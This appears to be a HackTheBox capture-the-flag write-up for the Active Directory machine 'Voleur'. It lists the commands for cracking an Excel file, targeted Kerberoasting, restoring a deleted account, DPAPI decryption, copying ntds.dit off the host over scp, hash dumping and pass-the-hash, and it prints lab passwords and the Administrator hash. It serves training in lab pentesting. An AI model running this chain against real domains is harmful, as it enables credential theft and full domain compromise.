
# HackTheBox — Voleur

**Difficulty:** Medium | **OS:** Windows | **Category:** Active Directory

---

## Overview

Voleur is a medium-rated Windows Active Directory machine that simulates a realistic enterprise pentest scenario. The attack chain involves SMB enumeration, Excel credential harvesting, targeted Kerberoasting, AD object restoration, DPAPI credential decryption, SSH pivoting via WSL, and finally dumping the NTDS.dit to achieve full domain compromise.

---

## Recon

### Port Scan

```bash
rustscan -a 10.129.232.130 -u 5000 -b 2000 -- -sCV
```

<img width="1147" height="800" alt="Pasted image 20260522023918" src="https://github.com/user-attachments/assets/00c8ec02-1987-413a-a09f-86c5044d4cfc" />

### Clock Skew Fix (Required for Kerberos)

```bash
ntpdate -u 10.129.232.130
```

### /etc/hosts

```bash
echo "10.129.232.130 voleur.htb dc.voleur.htb" | sudo tee -a /etc/hosts
```

DNS enumeration confirms the DC hostname:

```bash
dig NS voleur.htb @10.129.232.130
```

<img width="629" height="413" alt="Pasted image 20260522023937" src="https://github.com/user-attachments/assets/aa1e8367-8ba9-4e52-95fd-4249b837415b" />

### Kerberos Configuration

Edit `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = VOLEUR.HTB
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    rdns = false
    fcc-mit-ticketflags = true

[realms]
    VOLEUR.HTB = {
        kdc = 10.129.232.130
        admin_server = 10.129.232.130
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

---

## Initial Access — ryan.naylor

Starting credentials provided: `ryan.naylor:HollowOct31Nyt`

Obtain a TGT:

```bash
nxc smb 10.129.232.130 -u ryan.naylor -p HollowOct31Nyt -k --generate-tgt ryan.naylor
export KRB5CCNAME=ryan.naylor.ccache
```

<img width="1172" height="368" alt="Pasted image 20260522024022" src="https://github.com/user-attachments/assets/ada8294e-c2fd-4e7f-9a69-35eacbe4d01d" />

### SMB Enumeration

```bash
smbclient.py dc.voleur.htb -k -no-pass -target-ip 10.129.232.130
```

A password-protected Excel file `Access_Review.xlsx` is discovered on the share.

<img width="644" height="335" alt="Pasted image 20260522024041" src="https://github.com/user-attachments/assets/da3f4af6-8b10-4b91-8551-efd5725a3d50" />

### Cracking the Excel File

```bash
office2john Access_Review.xlsx > excel.hash
john excel.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="830" height="242" alt="Pasted image 20260522024107" src="https://github.com/user-attachments/assets/38ab0086-5a42-4b77-b4e0-ffc5c732a10c" />


**Password:** `football1`

### Credentials & Intelligence Gathered from Excel

| User         | Rights             | Notes                                                   |
| ------------ | ------------------ | ------------------------------------------------------- |
| ryan.naylor  | SMB                | Kerberos disabled                                       |
| marie.bryant | SMB                | —                                                       |
| lacey.miller | WinRM              | —                                                       |
| jeremy.combs | WinRM              | Access to Software folder                               |
| todd.wolfe   | —                  | Account deleted, password reset to `NightT1meP1dg3on14` |
| svc_backup   | Windows Backup     | —                                                       |
| svc_ldap     | LDAP Services      | `M1XyC9pW7qT5Vn`                                        |
| svc_iis      | IIS Administration | `N5pXyW1VqM7CZ8`                                        |
| svc_winrm    | WinRM              | —                                                       |


<img width="1254" height="568" alt="Pasted image 20260522024123" src="https://github.com/user-attachments/assets/c24171d0-ae5b-46d4-8cb0-dbc7cbbc6b4b" />


---

## BloodHound Enumeration

Running BloodHound as `svc_ldap` reveals the following attack paths:

```
svc_ldap  ──WriteSPN──►  svc_winrm
svc_ldap  ──MemberOf──►  RESTORE_USERS
RESTORE_USERS  ──GenericWrite──►  lacey.miller
RESTORE_USERS  ──GenericWrite──►  Second-Line Support Technicians (OU)
```

<img width="1004" height="439" alt="Pasted image 20260522024155" src="https://github.com/user-attachments/assets/fdfedfdf-4383-4cb2-826a-a0133b9bf696" />


**Key finding:** `svc_ldap` has `WriteSPN` over `svc_winrm`, enabling Targeted Kerberoasting.

---

## Foothold — svc_winrm via Targeted Kerberoasting

Obtain TGT for `svc_ldap`:

```bash
impacket-getTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -dc-ip 10.129.232.130
export KRB5CCNAME=svc_ldap.ccache
```

Set a SPN on `svc_winrm` and request the TGS:

```bash
python3 targetedKerberoast.py -u SVC_LDAP -d voleur.htb --dc-ip 10.129.232.130 \
  --dc-host dc.voleur.htb -k --no-pass --request-user svc_winrm
```

Crack the hash:

```bash
hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
```

**Credentials:** `svc_winrm:AFireInsidedeOzarctica980219afi`

### WinRM Access

```bash
impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -dc-ip 10.129.232.130
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

**User flag obtained.**

---

## Lateral Movement — todd.wolfe via AD Restore

The Excel file noted that `todd.wolfe` was deleted with a known reset password. The `RESTORE_USERS` group membership of `svc_ldap` allows restoring deleted AD objects.

```bash
python3 bloodyAD.py --host dc.voleur.htb -d voleur.htb \
  -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k set restore 'todd.wolfe'
```

`todd.wolfe` is restored to `OU=Second-Line Support Technicians`.

Obtain TGT:

```bash
impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14 -dc-ip 10.129.232.130
export KRB5CCNAME=todd.wolfe.ccache
```

---

## DPAPI Credential Decryption — jeremy.combs

Browsing SMB shares as `todd.wolfe` reveals DPAPI artifacts in his archived profile:

```bash
smbclient.py dc.voleur.htb -k -no-pass -target-ip 10.129.232.130
```

```
# Download credential blob
cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/
get 772275FAD58525253490A9B0039791D3

# Download master key
cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
get 08949382-134f-4c63-b93c-ce52efc0aa88
```

Decrypt the master key using Todd's password and SID:

```bash
impacket-dpapi masterkey \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -password 'NightT1meP1dg3on14' \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110
```

Use the recovered master key to decrypt the credential blob:

```bash
impacket-dpapi credential \
  -file 772275FAD58525253490A9B0039791D3 \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**Credentials:** `jeremy.combs:qT3V9pLXyN7W4m`

---

## Pivoting — svc_backup via SSH (WSL)

WinRM as `jeremy.combs`:

```bash
impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -dc-ip 10.129.232.130
export KRB5CCNAME=jeremy.combs.ccache
evil-winrm -i dc.voleur.htb -u jeremy.combs -r voleur.htb
```

In `C:\IT\Third-Line Support\` a `Note.txt` and an `id_rsa` private key are found. The note references a partially configured WSL environment intended for backup tooling. The key comment reveals it belongs to `svc_backup`.

SSH into the WSL instance:

```bash
ssh svc_backup@10.129.232.130 -i id_rsa -p 2222
```

---

## Privilege Escalation — NTDS.dit Dump

As `svc_backup` inside WSL, the Windows filesystem is mounted at `/mnt/c`. The IT share contains a full AD backup:

```
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
```

Exfiltrate via SCP:

```bash
scp -P 2222 -i id_rsa \
  'svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' \
  /tmp/ntds.dit

scp -P 2222 -i id_rsa \
  'svc_backup@10.129.232.130:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM' \
  /tmp/SYSTEM
```

Dump all hashes:

```bash
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
```

<img width="926" height="654" alt="Pasted image 20260522024230" src="https://github.com/user-attachments/assets/abbd3d9e-0c73-4c36-9e37-c2f73415b8bc" />


**Administrator hash recovered:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

---

## Domain Compromise — Pass-the-Hash via Kerberos

```bash
impacket-getTGT voleur.htb/administrator \
  -hashes :e656e07c56d831611b577b160b259ad2 \
  -dc-ip 10.129.232.130

export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -u administrator -r voleur.htb
```

<img width="653" height="394" alt="Pasted image 20260522024248" src="https://github.com/user-attachments/assets/b6208867-50f7-41f2-b978-5c329cf94cf7" />


**Root flag obtained. Domain fully compromised.**


---

_Writeup by ctx0 — HackTheBox Voleur_
